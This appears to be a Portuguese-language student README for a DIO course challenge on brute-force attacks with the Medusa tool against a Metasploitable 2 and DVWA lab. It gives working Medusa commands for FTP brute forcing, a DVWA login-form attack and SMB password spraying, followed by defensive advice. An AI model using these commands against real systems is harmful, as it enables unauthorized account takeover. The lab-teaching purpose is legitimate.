# 🚀 Desafio DIO: Ataques de Força Bruta com Medusa

Projeto prático de segurança ofensiva em ambiente controlado.

## 🧪 Ambiente
- **Máquina atacante**: Kali Linux
- **Alvo simulado**: Metasploitable 2 (IP: 192.168.56.102)
- **Serviços testados**: FTP, Web (DVWA), SMB

## 💥 Comandos Utilizados

### FTP
```bash
Web (DVWA)
medusa -h 192.168.56.102 -U wordlists/users.txt -P /usr/share/wordlists/rockyou.txt -M ftp -t 2
medusa -h 192.168.56.102 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m FORM:"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:HTTP/1.1" -m FAIL:"Login failed"
SMB (Password Spraying)
medusa -h 192.168.56.102 -U wordlists/users.txt -p password -M smbnt -t 2

🛡️ Recomendações de Segurança:
Nunca use senhas fracas, padrão ou repetidas;
Implemente bloqueio após tentativas falhas;
Mantenha todos os serviços atualizados;
Use autenticação em dois fatores (2FA) sempre que possível;
Realize testes de segurança apenas em ambientes autorizados.
